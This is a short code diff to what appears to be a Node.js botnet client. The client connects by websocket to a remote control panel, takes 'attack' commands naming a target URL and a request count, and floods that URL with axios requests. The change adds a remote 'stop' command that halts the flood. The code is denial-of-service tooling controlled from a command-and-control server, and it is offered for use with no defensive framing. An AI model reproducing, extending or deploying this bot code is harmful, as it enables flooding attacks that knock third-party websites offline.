@@ -9,6 +9,7 @@ if (isMainThread) {
 } else {
     const axios = require('axios');
     var url = ''
+    var stop = false
 const socket = io("wss://repfucker-panel.zsdyuqczexhehe0.repl.co", {
   reconnectionDelayMax: 10000,
 });
@@ -20,6 +21,7 @@ socket.on("disconnect", () => {
 });
 socket.on('attack',async m=>{
   console.log(m)
+  stop = false
   var args = m.split('*')
   url = args[0]
   console.log(parseInt(args[1]))
@@ -28,9 +30,17 @@ socket.on('attack',async m=>{
         start();
     }
 })
+socket.on('stop',()=>{
+  console.log('stopping')
+  stop = true
+})
     var e = 1;
     var f = 1;
     function start() {
+      if (stop) {
+        console.log('stopped')
+        return
+      }
          console.log('k')
         axios
             .request({
